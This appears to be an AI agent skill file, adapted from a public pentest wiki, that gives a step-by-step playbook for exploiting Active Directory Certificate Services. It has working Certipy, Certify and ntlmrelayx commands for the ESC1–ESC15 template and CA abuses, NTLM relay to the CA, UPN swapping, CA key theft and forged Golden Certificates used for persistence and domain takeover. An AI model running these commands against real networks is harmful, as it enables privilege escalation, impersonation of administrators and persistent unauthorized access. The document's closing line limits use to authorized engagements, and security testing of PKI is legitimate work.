---
name: active-directory-certificates
description: >-
  Exploit Active Directory Certificate Services (AD CS): ESC1 through ESC15 misconfigurations,
  certificate template and CA abuse, enrollment agent paths, Golden Certificates and
  certificate-based persistence. Use when a domain has an enterprise CA, when BloodHound or
  Certipy output shows certificate templates or enrollment rights, when you need a certificate
  that authenticates as another user or machine, or when reviewing PKI hardening. Covers Certipy,
  Certify, bloodyAD, ForgeCert, Rubeus and PKINIT abuse.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "18"
  generated-by: build/build.py
---

# AD CS Certificate Attacks (ESC1-ESC15)

Every AD CS attack ends the same way: obtain a certificate whose identity you should not have, then
exchange it for a TGT over PKINIT. The ESC numbers are not a progression — they are independent
misconfigurations, and only one needs to be true. Done means `certipy auth -pfx <file>.pfx` yields
a TGT for a more privileged principal, or an NT hash via UnPAC-the-hash.

## When to use this skill

- `certipy find` or `Certify.exe find /vulnerable` shows an enterprise CA and templates you can
  enroll in, or rights over a template/CA object.
- You hold `GenericWrite`/`GenericAll` over an account and want that identity (ESC9/ESC10/ESC14,
  with Shadow Credentials as the first step).
- A Web Enrollment endpoint or CA RPC interface is reachable and you have a coercion primitive
  (ESC8/ESC11 — coercion detail lives in `active-directory-lateral-movement`).
- You have child-domain DA and need forest EA (ESC5), or shell on the CA (ESC12, Golden Certificate).

Use `active-directory-enumeration` to find the CA during general enumeration, and
`active-directory-kerberos` for what to do with the TGT afterwards.

## First moves

1. **Enumerate CA, templates and rights in one shot** — every branch below comes off its output:

   ```bash
   certipy find -u user@domain.local -p 'password' -dc-ip 10.10.10.10 -vulnerable -stdout
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
   Certify.exe find /vulnerable
   ```

   Read the `[!] Vulnerabilities` block per template/CA: it names the ESC number and reason.

2. **Fall back to LDAP** if Certipy is unavailable — any domain user can read the CA list:

   ```bash
   netexec ldap domain.lab -u username -p password -M adcs
   ```

3. **ESC1/ESC2/ESC15 exploit — request with a SAN you are not entitled to**, then authenticate:

   ```bash
   certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' \
     -alt 'administrator@corp.local'
   certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
   ```

4. **ESC8 — relay a coerced DC authentication to Web Enrollment.** Probe first; a live endpoint
   answers with `WWW-Authenticate`:

   ```bash
   curl -i http://<webserver-ip>/certsrv/certfnsp.aspx
   certipy relay -ca 172.16.19.100
   ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```

5. **ESC11 — relay NTLM to the CA RPC interface** when `Enforce Encryption for Requests` is
   `Disabled`:

   ```bash
   certipy relay -target rpc://dc.domain.local -ca 'DOMAIN-CA' -template DomainController
   ```

6. **ESC9/ESC10 — turn a write edge into an identity.** Shadow Credentials, UPN swap, enroll,
   roll back:

   ```bash
   certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
   certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
   certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
   certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
   certipy auth -pfx administrator.pfx -domain corp.local
   ```

7. **CA private key in hand → forge any identity:**

   ```bash
   certipy ca -backup -u 'administrator@corp.local' -p 'Passw0rd!' -target 'CA.CORP.LOCAL' \
     -config 'CA.CORP.LOCAL\CORP-CA'
   certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
   certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.10.10'
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [adcs-overview.md](references/adcs-overview.md) | first — enrollment gates and the post-cert flow | enrollment (`dNSHostName`/`mail`), Certifried CVE-2022-26923, Certighost CVE-2026-54121, Pass-the-Certificate, UnPAC-the-hash, PKINIT errors |
| [esc-overview.md](references/esc-overview.md) | you need the one-line definition of each ESC | ESC1-ESC15 index |
| [esc01.md](references/esc01.md) | template has ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU | vulnerable-template LDAP filter, `find /vulnerable`, `req /altname` |
| [esc02.md](references/esc02.md) | template allows SAN plus Any Purpose or no EKU | Any-Purpose (`2.5.29.37.0`) filter, SAN request |
| [esc03.md](references/esc03.md) | a template carries the Certificate Request Agent EKU | enroll agent cert, `-on-behalf-of` with `-pfx` |
| [esc04.md](references/esc04.md) | you can write template properties | `modifyCertTemplate.py -get-acl`, ESS flag, `certipy template -save-old` + restore |
| [esc05.md](references/esc05.md) | child-domain DA → forest EA, or CA object write | template container / `pKIEnrollmentService` write, MMC as SYSTEM, publish, CA backup + forge |
| [esc06.md](references/esc06.md) | CA has EDITF_ATTRIBUTESUBJECTALTNAME2 | `Certify.exe cas` UserSpecifiedSAN, `/altname` on default User template, flag removal |
| [esc07.md](references/esc07.md) | low-priv users hold ManageCA / Manage Certificates | `-add-officer`, enable SAN, `issue`/`removeapproval`, writefile RCE, SubCA template |
| [esc08.md](references/esc08.md) | IIS exposes `/certsrv` and you can coerce | endpoint probe, Certipy blind spot, six relay variants |
| [esc09.md](references/esc09.md) | `CT_FLAG_NO_SECURITY_EXTENSION` template + GenericWrite | `StrongCertificateBindingEnforcement` 1 or 0, UPN swap + rollback |
| [esc10.md](references/esc10.md) | weak certificate mapping is configured | `StrongCertificateBindingEnforcement=0` (UPN) vs `CertificateMappingMethods=0x04` (`-ldap-shell`) |
| [esc11.md](references/esc11.md) | CA does not enforce RPC encryption | `Enforce Encryption for Requests: Disabled`, `certipy relay -target rpc://` |
| [esc12.md](references/esc12.md) | CA key is on a YubiHSM and you have shell | registry `AuthKeysetPassword`, repairstore, `certutil -sign` with UPN SAN |
| [esc13.md](references/esc13.md) | issuance policy has an OID group link | `msPKI-Certificate-Policy`, `msDS-OIDToGroupLink`, Universal group, `MergePFX` |
| [esc14.md](references/esc14.md) | you can write `altSecurityIdentities` | weak vs strong mapping table, Stifle, `Get-X509IssuerSerialNumberFormat` |
| [esc15.md](references/esc15.md) | schema v1 template + ESS (CVE-2024-49019) | BloodHound cypher, `--application-policies 'Client Authentication'`, agent OID |
| [golden-certificate.md](references/golden-certificate.md) | you hold the CA private key | CA backup methods, ForgeCert, `-crl` requirement, asktgt |

## Workflow

1. **Confirm a CA exists.** No enterprise CA, no ESC path — return to ACL/GPO work in
   `active-directory-enumeration`.
2. **Sort the `find` output into four buckets**, since each needs different capability:
   enroll rights and a broken template (ESC1/2/3/13/15); write on the template (ESC4, which
   converts it into an ESC1 shape — restore after); write on the CA (ESC6/7, plus ESC12 with
   shell); or a needed inbound authentication (ESC8/ESC11 → get coercion and relay from
   `active-directory-lateral-movement`).
3. **Handle mapping abuses separately.** ESC9/ESC10/ESC14 need a write edge plus a certificate, not
   a broken template. Start with `certipy shadow auto` for the victim's hash.
4. **Exploit, then judge the certificate's worth.** `certipy auth -pfx` yields a TGT; add
   `-username`/`-domain` when the certificate carries no domain hint. A machine or DC certificate →
   request a TGT as `dc1$` → DCSync.
5. **Treat PKINIT failure explicitly** (error table in `adcs-overview.md`):
   `KDC_ERROR_CLIENT_NOT_TRUSTED` → try another DC; `KDC_ERR_PADATA_TYPE_NOSUPP` → the CA may be
   expired, but Pass-the-Cert over LDAPS still works because that service only checks the SAN —
   use `certipy auth -ldap-shell`.
6. **Escalate scope or persist.** CA key → Golden Certificate; child-domain DA → ESC5 template
   duplication for Enterprise Admin.

## Gotchas

- An ESC1 certificate **keeps working after the target resets their password** — it is bound to the
  key, not the password. That is why it is a persistence primitive.
- Certipy's Web Enrollment check inspects only the CA host, so it reports `Enabled: False` for HTTP
  and HTTPS while a separate IIS server still serves `/certsrv`. Probe the endpoint directly.
- Templates requiring `dNSHostName` accept only principals that have the attribute. A computer
  object you created in AD has a **null** `dNSHostName` until domain-joined — which is exactly what
  Certifried (CVE-2022-26923) abuses when it points the attribute at the DC.
- ESC4 and ESC7 modify state: ESC4 without `-save-old`/`-configuration` leaves a permanently
  vulnerable template, and ESC7's `setconfig /enablesan /restart` restarts the CA service visibly.
- ESC15 is patched (CVE-2024-49019, November 2024); only schema version 1 templates with
  ENROLLEE_SUPPLIES_SUBJECT and no manager approval are affected.
- Forged certificates need a CDP extension: omitting `-crl` in `certipy forge` frequently produces
  `KDC_ERROR_CLIENT_NOT_TRUSTED`.
- ESC9 requires dropping the domain suffix from the new UPN (`-upn Administrator`, not
  `Administrator@corp.local`); ESC10's `0x04` variant instead sets `computer$@domain.local` and
  authenticates over Schannel (`-ldap-shell`).
- ESC12 needs shell on the **root CA** and reads its HSM password from
  `HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext; without host access the template
  posture is irrelevant.
- ESC14 mapping strength matters: `X509IssuerSubject`, `X509SubjectOnly` and `X509RFC822` are weak
  and policed; `X509IssuerSerialNumber` is the recommended strong form.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Template
and CA modifications are destructive — restore them, and never leave a forged CA backup behind.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
